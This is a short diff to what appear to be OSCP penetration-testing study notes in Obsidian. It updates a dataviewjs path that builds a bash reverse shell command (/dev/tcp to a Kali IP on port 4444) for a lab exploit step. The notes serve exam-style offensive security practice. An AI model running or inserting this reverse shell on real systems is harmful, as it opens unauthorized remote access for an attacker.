@@ -31,7 +31,7 @@ vi dependencies.yml
 
 Replace "id" at git-set with your command. 
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `/bin/bash -c 'bash -i >& /dev/tcp/${KaliIP}/4444 0>&1'`;
 
